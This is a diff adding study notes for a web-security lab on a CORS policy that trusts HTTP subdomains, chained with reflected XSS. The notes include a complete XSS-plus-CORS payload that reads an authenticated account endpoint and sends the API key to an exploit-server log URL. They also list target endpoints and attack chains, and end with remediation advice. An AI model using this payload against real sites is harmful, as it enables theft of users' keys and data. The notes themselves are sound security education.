@@ -607,3 +607,384 @@ CORS misconfig (null trusted)
 ## 🎯 FINAL MEMORY LINE
 
 Sandbox iframe forces Origin:null, and if server trusts it in CORS, attacker can read authenticated API responses.
+
+---
+
+# 🧪 LAB-3 — CORS Trusting Subdomains (HTTP + XSS Chain)
+
+---
+
+## 🎯 OVERVIEW
+
+This lab demonstrates a multi-step attack where:
+CORS trusts all subdomains (even HTTP)
++ Subdomain has XSS
+→ attacker executes JS from trusted origin
+→ steals sensitive data (API key)
+
+---
+
+## 🧠 WHAT IS THIS TOPIC?
+
+📌 Cross-Origin Resource Sharing (CORS)
+
+CORS allows a website to say:
+
+“Which external origins can read my responses?”
+
+---
+
+🔴 Vulnerability here:
+```
+Server trusts:
+http://*.lab-id
+```
+👉 Problems:
+
+- trusts ANY subdomain ❌
+- trusts HTTP (insecure) ❌
+
+---
+
+## 🧪 LAB WALKTHROUGH (STEP-BY-STEP)
+
+---
+
+### 🔹 STEP 1 — Login & identify sensitive endpoint
+
+Login:
+```
+wiener:peter
+```
+Go to:
+
+My Account
+
+Observe:
+
+GET /accountDetails
+
+Response contains:
+
+- API key
+- Access-Control-Allow-Credentials: true
+
+---
+
+### 🔹 STEP 2 — Confirm CORS misconfiguration
+
+In Burp Repeater:
+```
+Origin: http://subdomain.YOUR-LAB-ID.web-security-academy.net
+```
+Response:
+```
+Access-Control-Allow-Origin: http://subdomain...
+```
+---
+
+## 📸 Screenshot — Server Accepts Trusted Subdomain Origin
+
+![trusted-subdomain-origin](../images/trusted-subdomain-origin.png)
+
+---
+
+## 🧠 Conclusion:
+
+Server trusts ANY subdomain (even HTTP)
+
+---
+
+### 🔹 STEP 3 — Find exploitable subdomain
+
+Go to product page → click Check stock
+
+Observe:
+```
+http://stock.YOUR-LAB-ID.web-security-academy.net
+```
+---
+
+## 🧠 Important:
+
+- This is HTTP (insecure)
+- This is trusted by CORS
+
+---
+
+### 🔹 STEP 4 — Find XSS
+
+Test:
+```
+<script>alert(1)</script>
+```
+in:
+
+productId parameter
+
+---
+
+## 📸 Screenshot — XSS in productId Parameter
+
+![xss-productid-parameter](../images/xss-productid-parameter.png)
+
+---
+
+## 🧠 Result:
+
+Input is reflected AND executed → XSS confirmed
+
+---
+
+### 🔹 STEP 5 — Build exploit
+
+🎯 Goal:
+
+Run JS FROM trusted subdomain
+
+---
+
+## ✅ FINAL PAYLOAD
+```
+<script>
+document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>
+var req = new XMLHttpRequest();
+req.onload = function() {
+    location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=' + this.responseText;
+};
+req.open('GET','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+req.withCredentials = true;
+req.send();
+</script>&storeId=1"
+</script>
+```
+---
+
+### 🔹 STEP 6 — Deliver exploit
+
+1. Store
+
+2. View exploit
+
+3. Deliver to victim
+
+---
+
+### 🔹 STEP 7 — Retrieve API key
+
+Go to:
+
+Access log
+
+Find:
+```
+/log?key=...
+```
+---
+
+## 🧠 Decode
+
+Use:
+
+Burp Decoder 
+
+Extract:
+```
+"apikey":"REAL_KEY"
+```
+Submit → lab solved ✅
+
+---
+
+## 🧠 PAYLOAD BREAKDOWN
+
+---
+
+### 🔸 Part 1 — Redirect
+```
+document.location = "http://stock..."
+```
+👉 Send victim to vulnerable subdomain
+
+---
+
+### 🔸 Part 2 — XSS injection
+```
+productId=4<script>...</script>
+```
+👉 Execute JS on subdomain
+
+---
+
+### 🔸 Part 3 — CORS attack
+```
+req.open('GET','https://lab-id/accountDetails',true);
+req.withCredentials = true;
+```
+👉 Send authenticated request
+
+---
+
+### 🔸 Part 4 — Data exfiltration
+```
+location='https://exploit-server/log?key=' + response
+```
+👉 Send stolen data to attacker
+
+---
+
+## 🧠 ATTACK CHAIN (FULL FLOW)
+
+CORS trusts subdomain
+↓
+Subdomain has XSS
+↓
+Attacker injects JS
+↓
+JS runs from trusted origin
+↓
+CORS allows request
+↓
+Sensitive data returned
+↓
+Attacker steals it
+
+---
+
+## 🌍 REAL-WORLD SCENARIOS (100% PRACTICAL)
+
+---
+
+### 🟡 Scenario 1 — Large companies with subdomains
+
+*.company.com trusted
+
+But:
+
+blog.company.com → XSS vulnerable
+
+👉 attacker uses blog to steal:
+
+- user data
+- API tokens
+
+---
+
+### 🟡 Scenario 2 — Legacy HTTP services
+```
+http://api-old.company.com
+```
+Still trusted by:
+```
+https://main.company.com
+```
+👉 attacker injects via HTTP → steals data
+
+---
+
+### 🟡 Scenario 3 — CDN / analytics subdomains
+
+cdn.company.com
+
+If vulnerable:
+
+→ full CORS bypass
+
+---
+
+### 🟡 Scenario 4 — Microservices architecture
+
+auth.service.com
+api.service.com
+dashboard.service.com
+
+If one is weak:
+
+→ whole system compromised
+
+---
+
+## ⚠️ HIGH VALUE TARGET ENDPOINTS
+
+Look for:
+```
+/accountDetails
+/api/user
+/api/admin
+/api/token
+/settings
+/payment-info
+```
+---
+
+## 🔗 MULTI-CHAIN ATTACKS
+
+---
+
+### Chain 1
+
+XSS (subdomain)
++ CORS trust
+→ API key theft
+
+---
+
+### Chain 2
+
+CORS + CSRF
+→ full account takeover
+
+---
+
+### Chain 3
+
+HTTP subdomain + MITM
+→ inject JS → data exfiltration
+
+---
+
+### Chain 4
+
+CORS + JWT/token leak
+→ persistent access
+
+---
+
+## 🛡️ REMEDIATION (IMPORTANT)
+
+---
+
+❌ Bad practice
+
+Access-Control-Allow-Origin: *
+or
+trust *.domain.com
+
+---
+
+✅ Secure approach
+
+- allow only specific domains
+- avoid trusting HTTP origins
+- remove vulnerable subdomains
+- sanitize inputs (prevent XSS)
+- avoid Access-Control-Allow-Credentials unless necessary
+
+---
+
+## 🧠 MENTAL MODEL
+
+CORS = “Who do I trust?”
+
+If you trust:
+- insecure origin (HTTP)
+- compromised origin (XSS)
+
+→ attacker becomes trusted
+→ data leak happens
+
+---
+
+## 🎯 FINAL MEMORY LINE
+
+If CORS trusts subdomains and one subdomain has XSS, attacker can act as that origin and steal sensitive data.
